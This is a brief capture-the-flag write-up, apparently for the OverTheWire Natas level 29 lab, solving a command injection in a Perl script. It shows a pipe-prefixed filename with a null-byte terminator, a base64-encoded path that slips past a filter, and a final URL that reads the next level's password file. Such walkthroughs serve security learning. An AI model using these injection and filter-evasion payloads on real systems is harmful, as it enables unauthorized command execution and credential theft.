So there's a perl script running here.
The URL shows that it's selecting a file.
Perl interprets filenames starting with a | as a command so changing the filename to "|whoami" should work.
It doesn't. :(
After some more reading I found that I need to add a terminating string %00.

?file=|whoami%00

Works!

When trying to read /etc/natas_webpass/natas30 I got denied. I'm assuming there's some kind of filter.
Before trying to read the code and find a bypass, I tried something that worked.

cat < `echo L2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMzAK | base64 -d` worked :).

Final URL:
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20`echo%20L2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMzAK%20|%20base64%20-d%20`%00
